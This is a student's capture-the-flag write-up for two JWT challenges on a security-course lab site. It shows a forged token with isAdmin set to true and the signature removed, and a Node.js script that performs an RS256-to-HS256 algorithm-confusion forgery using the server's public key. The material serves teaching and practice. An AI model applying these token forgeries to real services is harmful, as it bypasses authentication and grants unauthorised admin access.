
  

#  Mythique 

The first step I made to get the flag was took the JWT and paste in jwt.io.
I understood it was ineluctable to set isAdmin at true and conserving the same data structure of the token.

### Mythique 1
In this exercises I took the token in my browser and paste it into https://dinochiesa.github.io/jwt/.
I changed isAdmin to true and past the one and second element in my browser.
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJleHAiOjE2NzExMTg2MjgsImRhdGEiOnsibmFtZSI6IlBhdGF0ZSBIYWJpbGUiLCJpc0FkbWluIjp0cnVlfSwiaWF0IjoxNjcxMTE1MDI4fQ.
FIRST.SECOND.~~THIRD~~
FIRST.SECOND.
Then go on the page https://mythique1.secu-web.blackfoot.dev/flag and the flag appear.

### Mythique 2
I understood at the beginning it was mandatory to recreate a token from the public key gave from the page.

After some search I find a similar CTF on google and the explication to solve this was to brain the server by signing a token with the public key in another algorithm. 
https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Web-3.md
On the web page the algorithm was RS and my code is using HS algorithm.

```js
const  jwt = require('jsonwebtoken')
let  fs = require('fs')
let  publicKey = fs.readFileSync('./serverkey.pub');
let  token = jwt.sign({"data": {"name":  "Nuage :)","isAdmin":  true},"iat":  1671114339}, publicKey, { algorithm:  'HS256', noTimestamp:  true });
console.log(token)
```


  